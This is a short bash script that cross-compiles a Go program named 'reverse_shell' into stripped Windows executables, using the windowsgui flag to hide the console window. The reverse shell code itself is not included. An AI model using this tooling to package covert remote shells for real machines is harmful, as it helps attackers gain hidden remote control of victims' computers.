#!/bin/bash

# 交叉编译脚本 - 在 macOS 上编译 Windows 可执行文件

OUTPUT_NAME="reverse_shell"
OUTPUT_DIR="./bin"

# 创建输出目录
mkdir -p "$OUTPUT_DIR"

echo "[*] Building Windows executables..."

# Windows 64位
echo "[+] Compiling Windows amd64..."
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui" -o "$OUTPUT_DIR/${OUTPUT_NAME}_win64.exe" main.go

# Windows 32位
echo "[+] Compiling Windows 386..."
GOOS=windows GOARCH=386 go build -ldflags="-s -w -H windowsgui" -o "$OUTPUT_DIR/${OUTPUT_NAME}_win32.exe" main.go

echo ""
echo "[*] Build complete! Output files:"
ls -lh "$OUTPUT_DIR"

echo ""
echo "[*] File hashes (SHA256):"
shasum -a 256 "$OUTPUT_DIR"/*
